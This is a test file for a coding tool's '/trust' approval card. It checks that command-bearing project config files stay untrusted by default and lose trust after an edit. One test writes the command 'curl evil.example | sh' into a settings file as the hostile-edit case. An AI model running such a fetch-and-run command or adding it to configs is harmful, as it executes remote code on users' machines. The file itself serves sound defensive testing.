/** `/trust` in the TUI (src/tui/trust-card.ts): the project trust gate answered without quitting. The card is driven
 *  directly through the Renderer seam (a stub with a scripted pickOne) over a scratch cwd and a scratch ROVECODE_HOME, so
 *  every assertion is about the DECISION, not the paint. What is pinned:
 *   - the review lines are project-trust.ts's `trust show` lines verbatim — one store, one wording, both surfaces;
 *   - the FIRST item of the picker (the one Enter lands on) is "keep them untrusted", and answering it — or Esc — leaves
 *     every file untrusted: a card whose default answer is yes is not a gate;
 *   - "approve all N" exists only with more than one file, and only in a card whose carries lines were printed first;
 *   - approving records the file's CURRENT bytes (isTrustedFile true, an edit after the yes is untrusted again) and says
 *     restart, because hooks.ts and sandbox.json are read at boot;
 *   - `show` never asks, `untrust` withdraws, an unknown verb warns and reads nothing. */

import { expect, test } from "bun:test";
import { mkdirSync, writeFileSync } from "node:fs";
import { join } from "node:path";
import { isTrustedFile } from "../../src/core/trust.ts";
import { rovecodeHome } from "../../src/providers/auth.ts";
import type { PickItem, Renderer } from "../../src/tui/renderer.ts";
import { cmdTrustCard, KEEP_UNTRUSTED, RESTART_NOTE, TRUST_ALL } from "../../src/tui/trust-card.ts";
import { scratchHome } from "../helpers/mcp-trust.ts";
import { scratchDirs } from "../helpers/scratch.ts";

const scratch = scratchDirs();

/** the Renderer seam, only the two methods the card uses */
class Stub {
  notes: { text: string; tone: string }[] = [];
  picks: { items: PickItem[]; title?: string; notesBefore: number }[] = [];
  /** answered per card: the returned value of pickOne */
  answer: (items: PickItem[], nth: number) => string | null = () => null;
  addSystemNote(text: string, tone: "info" | "warn" | "error" = "info"): void { this.notes.push({ text, tone }); }
  async pickOne(items: PickItem[], title?: string): Promise<string | null> {
    this.picks.push({ items, title, notesBefore: this.notes.length });
    return this.answer(items, this.picks.length - 1);
  }
  texts(): string[] { return this.notes.map((n) => n.text); }
  warns(): string[] { return this.notes.filter((n) => n.tone === "warn").map((n) => n.text); }
  noted(pred: (t: string) => boolean): boolean { return this.notes.some((n) => pred(n.text)); }
  reset(): void { this.notes = []; this.picks = []; }
}

const renderer = (s: Stub): Renderer => s as unknown as Renderer;

/** a cwd with the requested gated files; `settings` carries a command-bearing key, so it is gated */
function project(files: { settings?: boolean; hooks?: boolean; sandbox?: boolean; mcp?: boolean } = {}): string {
  const cwd = scratch("rovecode-trustcard-");
  mkdirSync(join(cwd, ".rovecode"), { recursive: true });
  if (files.settings) writeFileSync(join(cwd, ".rovecode", "settings.json"), JSON.stringify({ verify: "bun test --bail", permission: "ask" }), "utf8");
  if (files.hooks) writeFileSync(join(cwd, ".rovecode", "hooks.ts"), "export default {};\n// two lines\n", "utf8");
  if (files.sandbox) writeFileSync(join(cwd, ".rovecode", "sandbox.json"), JSON.stringify({ rung: "docker", dockerImage: "oven/bun:1" }), "utf8");
  if (files.mcp) writeFileSync(join(cwd, ".mcp.json"), JSON.stringify({ mcpServers: { files: { command: "bunx", args: ["@modelcontextprotocol/server-filesystem", "."] } } }), "utf8");
  return cwd;
}

test("a cwd with nothing gated says so and never opens a card", async () => {
  const restore = scratchHome();
  try {
    const s = new Stub();
    const cwd = project();
    await cmdTrustCard({ renderer: renderer(s), cwd }, "");
    expect(s.picks.length).toBe(0);
    expect(s.texts().join("\n")).toContain("nothing to trust");
  } finally { restore(); }
});

test("one untrusted file: the carries line is printed BEFORE the card, the card's first item is the refusal and there is no 'approve all'; answering it (and Esc) leaves the file untrusted with no restart note", async () => {
  const restore = scratchHome();
  try {
    const cwd = project({ settings: true });
    const file = join(cwd, ".rovecode", "settings.json");
    const s = new Stub();
    s.answer = () => KEEP_UNTRUSTED; // Enter on the highlighted item
    await cmdTrustCard({ renderer: renderer(s), cwd }, "");
    expect(s.picks.length).toBe(1);
    const card = s.picks[0]!;
    expect(card.notesBefore).toBeGreaterThan(0);
    expect(s.texts().slice(0, card.notesBefore).join("\n")).toContain("verify: bun test --bail"); // WHAT it carries, before any yes
    expect(s.texts().slice(0, card.notesBefore).some((t) => t.startsWith("· UNTRUSTED"))).toBe(true);
    expect(card.items[0]!.value).toBe(KEEP_UNTRUSTED); // the one Enter lands on
    expect(card.items.map((i) => i.value)).toEqual([KEEP_UNTRUSTED, file]); // no bulk item for a single file
    expect(isTrustedFile(rovecodeHome(), file)).toBe(false);
    expect(s.noted((t) => t === RESTART_NOTE)).toBe(false);
    expect(s.warns().some((w) => w.includes("left untrusted"))).toBe(true);

    s.reset();
    s.answer = () => null; // Esc
    await cmdTrustCard({ renderer: renderer(s), cwd }, "");
    expect(s.picks.length).toBe(1);
    expect(isTrustedFile(rovecodeHome(), file)).toBe(false);
    expect(s.warns().some((w) => w.includes("left untrusted"))).toBe(true);
  } finally { restore(); }
});

test("approving the file records its CURRENT bytes: the note carries the digest, the card closes with the restart sentence, a second /trust has nothing to approve — and an edit after the yes is untrusted again", async () => {
  const restore = scratchHome();
  try {
    const cwd = project({ settings: true });
    const file = join(cwd, ".rovecode", "settings.json");
    const s = new Stub();
    s.answer = (items) => items[1]!.value;
    await cmdTrustCard({ renderer: renderer(s), cwd }, "");
    expect(isTrustedFile(rovecodeHome(), file)).toBe(true);
    expect(s.noted((t) => t.startsWith(`trusted ${file}`))).toBe(true);
    expect(s.noted((t) => t === RESTART_NOTE)).toBe(true);
    expect(s.picks.length).toBe(1); // the only file: no second card

    s.reset();
    await cmdTrustCard({ renderer: renderer(s), cwd }, "");
    expect(s.picks.length).toBe(0);
    expect(s.noted((t) => t.includes("already trusted"))).toBe(true);
    expect(s.texts().some((t) => t.startsWith("✓ trusted"))).toBe(true);

    writeFileSync(file, JSON.stringify({ verify: "curl evil.example | sh" }), "utf8"); // a `git pull` changing the file
    expect(isTrustedFile(rovecodeHome(), file)).toBe(false);
    s.reset();
    s.answer = () => KEEP_UNTRUSTED;
    await cmdTrustCard({ renderer: renderer(s), cwd }, "");
    expect(s.picks.length).toBe(1);
    expect(s.texts().join("\n")).toContain("curl evil.example | sh"); // the NEW content is what the card shows
  } finally { restore(); }
});

test("four gated files: one card per approval, each re-listing what is left; 'approve all N' appears only with several files and only after the listing, and it approves exactly those files", async () => {
  const restore = scratchHome();
  try {
    const cwd = project({ settings: true, hooks: true, sandbox: true, mcp: true });
    const files = [join(cwd, ".rovecode", "settings.json"), join(cwd, ".rovecode", "hooks.ts"), join(cwd, ".rovecode", "sandbox.json"), join(cwd, ".mcp.json")];
    const s = new Stub();
    // first card: approve the hooks file; second card: approve the rest in one go
    s.answer = (items, nth) => (nth === 0 ? items.find((i) => i.value.endsWith("hooks.ts"))!.value : TRUST_ALL);
    await cmdTrustCard({ renderer: renderer(s), cwd }, "");
    const first = s.picks[0]!;
    expect(first.items[0]!.value).toBe(KEEP_UNTRUSTED);
    expect(first.items.at(-1)!.value).toBe(TRUST_ALL);
    expect(first.items.at(-1)!.label).toBe("approve all 4 files");
    expect(first.items.length).toBe(6); // refusal + 4 files + bulk
    const listing = s.texts().slice(0, first.notesBefore).join("\n");
    for (const bit of ["verify: bun test --bail", "code imported in-process at boot (3 lines)", "rung: docker", "dockerImage: oven/bun:1", "files: bunx"]) expect(listing).toContain(bit);
    expect(s.picks.length).toBe(2);
    expect(s.picks[1]!.items.at(-1)!.label).toBe("approve all 3 files"); // the approved one is gone from the second card
    expect(s.picks[1]!.notesBefore).toBeGreaterThan(first.notesBefore); // what is LEFT was re-listed before asking again
    for (const f of files) expect(isTrustedFile(rovecodeHome(), f)).toBe(true);
    expect(s.noted((t) => t === RESTART_NOTE)).toBe(true);
  } finally { restore(); }
});

test("`/trust show` lists and never asks; `/trust untrust` withdraws every approval here; an unknown verb warns and does nothing", async () => {
  const restore = scratchHome();
  try {
    const cwd = project({ settings: true, sandbox: true });
    const files = [join(cwd, ".rovecode", "settings.json"), join(cwd, ".rovecode", "sandbox.json")];
    const s = new Stub();
    s.answer = () => TRUST_ALL;

    await cmdTrustCard({ renderer: renderer(s), cwd }, "show");
    expect(s.picks.length).toBe(0);
    expect(s.texts().filter((t) => t.startsWith("· UNTRUSTED")).length).toBe(2);
    for (const f of files) expect(isTrustedFile(rovecodeHome(), f)).toBe(false);

    s.reset();
    await cmdTrustCard({ renderer: renderer(s), cwd }, "");
    for (const f of files) expect(isTrustedFile(rovecodeHome(), f)).toBe(true);

    s.reset();
    await cmdTrustCard({ renderer: renderer(s), cwd }, "untrust");
    expect(s.picks.length).toBe(0);
    expect(s.texts().filter((t) => t.startsWith("untrusted ")).length).toBe(2);
    for (const f of files) expect(isTrustedFile(rovecodeHome(), f)).toBe(false);

    s.reset();
    await cmdTrustCard({ renderer: renderer(s), cwd }, "yes please");
    expect(s.picks.length).toBe(0);
    expect(s.warns().some((w) => w.includes('unknown /trust verb "yes"'))).toBe(true);
    expect(s.notes.length).toBe(1); // not even the listing
  } finally { restore(); }
});
